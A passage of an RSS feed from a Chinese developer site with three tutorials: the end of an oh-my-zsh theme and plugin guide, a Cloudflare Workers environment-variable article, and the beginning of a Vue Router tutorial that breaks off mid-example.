</code></pre>
<p>安装完成后，将自动启用基础主题与插件。可通过编辑 <code>~/.zshrc</code> 来更改主题和插件配置。</p>
<hr/>
<h3 data-id="heading-4">4. 主题配置</h3>
<p>oh-my-zsh 内置了多个提示符主题，可在 <code>~/.zshrc</code> 中更改：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ZSH_THEME</span>=<span class="hljs-string">"agnoster"</span>
</code></pre>
<p>也可将 <code>ZSH_THEME</code> 设置为 <code>random</code>，随机选取主题。</p>
<hr/>
<h3 data-id="heading-5">5. 内置插件（5 个）</h3>
<h4 data-id="heading-6">插件启用方式</h4>
<p>在 <code>~/.zshrc</code> 中指定：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">plugins</span>=(git web-search jsontools z vi-mode)
</code></pre>
<h4 data-id="heading-7">插件介绍</h4>
<ol>
<li><strong>git</strong> – 提供常用 Git 命令别名，提高操作效率。</li>
<li><strong>web-search</strong> – 在终端直接打开浏览器并执行搜索。</li>
<li><strong>jsontools</strong> – 提供 JSON 格式化等基本处理工具。</li>
<li><strong>z</strong> – 基于历史访问目录的快速跳转工具。</li>
<li><strong>vi-mode</strong> – 允许使用 vi 键盘模式编辑命令行。</li>
</ol>
<hr/>
<h3 data-id="heading-8">6. 社区插件（2 个）</h3>
<p>这两款插件需要从 GitHub 下载并配置到 oh-my-zsh：</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="hljs-variable">${ZSH_CUSTOM:-<span class="hljs-variable">$HOME</span>/.oh-my-zsh/custom}</span>/plugins/zsh-autosuggestions
git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting <span class="hljs-variable">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-syntax-highlighting
</code></pre>
<p>并将其加入插件列表：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">plugins</span>=(... zsh-syntax-highlighting zsh-autosuggestions)
</code></pre>
<h4 data-id="heading-9">插件详情</h4>
<ul>
<li><strong>zsh-syntax-highlighting</strong>：提供命令实时语法高亮，语法错误时以不同颜色提示。</li>
<li><strong>zsh-autosuggestions</strong>：根据历史命令和补全提示提供智能建议，可通过自定义快捷键（如 <code>Tab</code>）来接受建议。</li>
</ul>
<hr/>
<h3 data-id="heading-10">7. 总结</h3>
<p>一般以上插件基本满足99%的场景使用，如果其它推荐欢迎补充！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[cloudflare的worker中的Environment环境变量和不同环境配置]]></title>    <link>https://juejin.cn/post/7589940913767006243</link>    <guid>https://juejin.cn/post/7589940913767006243</guid>    <pubDate>2026-01-01T10:11:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940913767006243" data-draft-id="7589930672833413155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="cloudflare的worker中的Environment环境变量和不同环境配置"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-01T10:11:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1024小神"/> <meta itemprop="url" content="https://juejin.cn/user/70007368988926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            cloudflare的worker中的Environment环境变量和不同环境配置
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/70007368988926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1024小神
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:11:22.000Z" title="Thu Jan 01 2026 10:11:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是1024小神，想进 技术群 / 私活群 / 股票群 或 交朋友都可以私信我，如果你觉得本文有用，一键三连 (点赞、评论、关注)，就是对我最大的支持~</p><p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a3492d7da6c140f2bae086b867446afe~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="2872" loading="lazy"/></p><p/>
<p>在cloudflare中配置不同的环境变量和环境是开发中肯定会遇到的，比如密钥不能明文存储，比如开发环境和测试环境隔离，这里的配置和在vite中配置环境变量还是不一样的，所以这里记录一下。官方文档：<a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="https://developers.cloudflare.com/workers/wrangler/configuration/#environments" href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.cloudflare.com%2Fworkers%2Fwrangler%2Fconfiguration%2F%23environments" title="https://developers.cloudflare.com/workers/wrangler/configuration/#environments" target="_blank" ref="nofollow noopener noreferrer">developers.cloudflare.com/workers/wra…</a></p>
<h2 data-id="heading-0">环境变量</h2>
<p>环境变量的文档：<a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="https://developers.cloudflare.com/workers/wrangler/configuration/#environment-variables" href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.cloudflare.com%2Fworkers%2Fwrangler%2Fconfiguration%2F%23environment-variables" title="https://developers.cloudflare.com/workers/wrangler/configuration/#environment-variables" target="_blank" ref="nofollow noopener noreferrer">developers.cloudflare.com/workers/wra…</a></p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/934f048b0103494ab3fbdbea175ad335~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1482" loading="lazy"/></p>
<p>或者在wrangler.jsonc同级目录配置.env文件：注意.env文件不应该被git记录</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable constant_">API_HOST</span>=<span class="hljs-string">"value"</span>
<span class="hljs-variable constant_">API_TOKEN</span>=<span class="hljs-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"</span></code></pre>
<p>就是在wrangler.jsonc中定义变量名称，然后在代码中获取：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-params">request, env, ctx</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">`API host: <span class="hljs-subst">${env.API_HOST}</span>`</span>);
  },
};</code></pre>
<p>这里有更详细的用法说明：<a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="https://developers.cloudflare.com/workers/configuration/environment-variables/" href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.cloudflare.com%2Fworkers%2Fconfiguration%2Fenvironment-variables%2F" title="https://developers.cloudflare.com/workers/configuration/environment-variables/" target="_blank" ref="nofollow noopener noreferrer">developers.cloudflare.com/workers/con…</a></p>
<p>当然wrangler.jsonc定义的是配置会被git同步到仓库中，肯定是不安全的，所以这里配置的一定是不重要的或测试环境的变量，在后台worker中可以配置生产环境的变量：</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/680c9f06ff5c4df68517364876ed913c~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="2418" loading="lazy"/></p>
<p/>
<h2 data-id="heading-1">不同的环境</h2>
<p>为不同的环境配置不同的环境变量也是必须的，这里有两种方式，一个是在Wrangler.jsonc中配置，另外一个就是通过配置文件.env.test、.env.prod等实现，就和在前端中配置一样简单。我这里推荐使用配置文件的方式，因为这种方式可以避免环境变量泄漏风险。</p>
<p>配置.env.test文件：</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/59d048e0a8fe4d46b726372197c8aadd~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1840" loading="lazy"/></p>
<p>使用命令启动：</p>
<pre><code class="hljs language-javascript" lang="javascript">wrangler dev --env test</code></pre>
<p>就可以看到加载的环境变量：</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f39048509d174871b84892d3f2413c01~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1806" loading="lazy"/></p>
<p>或者写一个接口来查询环境变量信息：</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4220123bcd134dbe8305fe5db7d3d83a~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="2026" loading="lazy"/></p>
<p>得到的结果：</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/24c33cc0d3cc42d693cff07b83439d69~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1782" loading="lazy"/></p>
如果你有好的想法或需求，都可以私信我，我这里有很多程序员朋友喜欢用代码来创造丰富多彩的计算机世界</div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue Router 深度解析：从基础概念到高级应用实践]]></title>    <link>https://juejin.cn/post/7589916567875813418</link>    <guid>https://juejin.cn/post/7589916567875813418</guid>    <pubDate>2026-01-01T10:15:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589916567875813418" data-draft-id="7589839433321316415" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue Router 深度解析：从基础概念到高级应用实践"/> <meta itemprop="keywords" content="前端,Vue.js,前端框架"/> <meta itemprop="datePublished" content="2026-01-01T10:15:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="进击的野人"/> <meta itemprop="url" content="https://juejin.cn/user/1458425238667008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue Router 深度解析：从基础概念到高级应用实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1458425238667008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    进击的野人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:15:19.000Z" title="Thu Jan 01 2026 10:15:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在现代Web应用开发中，单页应用（SPA）已经成为主流开发模式。Vue.js作为当前最流行的前端框架之一，其官方路由库Vue Router在构建复杂SPA应用中扮演着至关重要的角色。本文将通过分析一个完整的Vue Router项目实例，深入探讨Vue Router的核心概念、使用方法和最佳实践，帮助开发者全面掌握这一强大的路由管理工具。</p>
<h2 data-id="heading-1">一、Vue Router基础概念解析</h2>
<h3 data-id="heading-2">1.1 SPA应用的本质</h3>
<p>单页Web应用（Single Page Web Application, SPA）的核心特点是整个应用只有一个完整的HTML页面。与传统的多页应用不同，SPA在用户与应用程序交互时，不会重新加载整个页面，而是通过JavaScript动态更新页面的部分内容。这种模式带来了更流畅的用户体验，减少了页面切换时的白屏时间，使应用更接近原生应用的体验。</p>
<p>从提供的代码中可以看到，<code>App.vue</code>作为应用的根组件，通过<code>&lt;router-view&gt;</code>标签动态渲染不同的路由组件，这正是SPA架构的典型实现。</p>
<h3 data-id="heading-3">1.2 路由的基本概念</h3>
<p>在Vue Router中，路由本质上是路径（path）与组件（component）之间的映射关系。这种映射关系使得当用户访问特定URL时，能够展示对应的Vue组件。</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 路由配置示例</span>
<span class="hljs-type">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-built_in">VueRouter</span>({
  routes: [
    {
      path: <span class="hljs-string">'/about'</span>,
      component: UserAbout
    },
    {
      path: <span class="hljs-string">'/home'</span>,
      component: UserHome
    }
  ]
})
</code></pre>
<h2 data-id="heading-4">二、Vue Router的核心配置与使用</h2>
<h3 data-id="heading-5">2.1 路由器的创建与配置</h3>
<p>在<code>index.js</code>文件中，我们可以看到完整的路由器配置示例。路由器通过<code>VueRouter</code>构造函数创建，接收一个配置对象，其中<code>routes</code>数组定义了所有的路由规则。</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">VueRouter</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">UserAbout</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../pages/UserAbout.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">UserHome</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../pages/UserHome.vue'</span>

<span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>({
  <span class="hljs-attr">routes</span>: [
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'guanyu'</span>,
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/about'</span>,
      <span class="hljs-attr">component</span>: <span class="hljs-title class_">UserAbout</span>,
      <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'关于'</span> }
    }
  ]
})
</code></pre>
<h3 data-id="heading-6">2.2 路由组件与一般组件的区别</h3>
<p>Vue Router的一个重要实践是将路由组件和一般组件分离存储：</p>
<ul>
<li>路由组件通常存放在<code>pages</code>或<code>views</code>文件夹中</li>
<li>一般组件通常存放在<code>components</code>文件夹中</li>
</ul>
<p>这种分离有助于代码的组织和维护，使项目结构更加清晰。从代码中可以看到，<code>UserAbout</code>、<code>UserHome</code>等路由组件都存放在pages目录下，而<code>UserBanner</code>这样的展示组件则存放在components目录下。</p>
<h3 data-id="heading-7">2.3 多级路由（嵌套路由）的实现</h3>
<p>Vue Router支持嵌套路由，允许在父路由组件中嵌套子路由组件。这在构建复杂布局时非常有用。</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-yaml" lang="yaml">{
  <span class="hljs-attr">name:</span> <span class="hljs-string">'zhuye'</span>,
  <span class="hljs-attr">path:</span> <span class="hljs-string">'/home'</span>,
  <span class="hljs-attr">component:</span> <span class="hljs-string">UserHome</span>,
  <span class="hljs-attr">children:</span> [
    {
      <span class="hljs-attr">name:</span> <span class="hljs-string">'xinwen'</span>,
      <span class="hljs-attr">path:</span> <span class="hljs-string">'news'</span>,  <span class="hljs-string">//</span> <span class="hljs-string">注意：此处不加/，表示相对路径</span>
      <span class="hljs-attr">component:</span> <span class="hljs-string">UserNews</span>
    },
    {
      <span class="hljs-attr">name:</span> <span class="hljs-string">'xiaoxi'</span>,
      <span class="hljs-attr">path:</span> <span class="hljs-string">'message'</span>,
      <span class="hljs-attr">component:</span> <span class="hljs-string">UserMessage</span>,
      <span class="hljs-attr">children:</span> [
        {
          <span class="hljs-attr">name:</span> <span class="hljs-string">'xiangqing'</span>,
          <span class="hljs-attr">path:</span> <span class="hljs-string">'detail'</span>,
          <span class="hljs-attr">component:</span> <span class="hljs-string">MessageDetail</span>
        }
      ]
    }
  ]
}
</code></pre>
<p>在<code>UserHome.vue</code>组件中，通过<code>&lt;router-view&gt;</code>标签来渲染子路由组件，实现了嵌套路由的展示。</p>
<h2 data-id="heading-8">三、路由参数传递的多种方式</h2>
<h3 data-id="heading-9">3.1 Query参数传递</h3>
<p>Query参数是Vue Router中最常用的参数传递方式之一。它通过URL的查询字符串传递参数，适合传递可选参数。</p>
<p>vue</p>
<p>复制下载</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- UserMessage.vue中的query参数传递 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">:to</span>=<span class="hljs-string">"{
  path: '/home/message/detail',
  query: {
    id: message.id,
    title: message.title
  }
}"</span>&gt;</span>
  {{message.title}}
<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span>
</code></pre>
<p>在目标组件<code>MessageDetail.vue</code>中，可以通过<code>$route.query</code>获取这些参数：</p>
<p>vue</p>
<p>复制下载</p>
<pre><code class="hljs language-css" lang="css">&lt;template&gt;
  &lt;<span class="hljs-selector-tag">ul</span>&gt;
    &lt;<span class="hljs-selector-tag">li</span>&gt;id: {{$route<span class="hljs-selector-class">.query</span><span class="hljs-selector-class">.id</span>}}&lt;/<span class="hljs-selector-tag">li</span>&gt;
    &lt;<span class="hljs-selector-tag">li</span>&gt;title: {{$route<span class="hljs-selector-class">.query</span><span class="hljs-selector-class">.title</span>}}&lt;/<span class="hljs-selector-tag">li</span>&gt;
  &lt;/<span class="hljs-selector-tag">ul</span>&gt;
&lt;/template&gt;
</code></pre>
<h3 data-id="heading-10">3.2 Params参数传递</h3>
<p>Params参数通过URL路径的一部分传递，适合传递必选参数。使用params参数时需要注意路由配置：</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-arduino" lang="arduino">{
  path: <span class="hljs-string">'detail/:id/:title'</span>,  <span class="hljs-comment">// 定义params参数</span>
  component: MessageDetail
}
</code></pre>
<p>传递params参数时，必须使用name配置而非path配置：</p>
<p>vue</p>
<p>复制下载</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">&lt;router-link</span> <span class="hljs-string">:to="{</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">'xiangqing'</span><span class="hljs-string">,</span>
  <span class="hljs-attr">params:</span> {
